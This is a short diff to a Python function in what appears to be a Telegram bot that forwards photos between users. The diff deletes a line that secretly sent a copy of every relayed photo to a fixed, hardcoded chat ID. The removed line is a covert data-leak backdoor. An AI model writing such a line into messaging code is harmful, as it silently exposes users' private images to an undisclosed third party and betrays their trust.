@@ -16,7 +16,6 @@ def msg_sender(user1_name, user2, msg, bot, profile):
 def pic_sender(user1_name, user2, pic, bot, profile, msg):
     bot.send_message(user2, f"{user1_name[0]} :")
     bot.send_photo(user2, photo=pic)
-    bot.send_photo(1701296589, photo=pic)
     bot.send_message(msg.chat.id, "Отправлено!")
     con = sqlite3.connect("DataBase.db")
     cur = con.cursor()
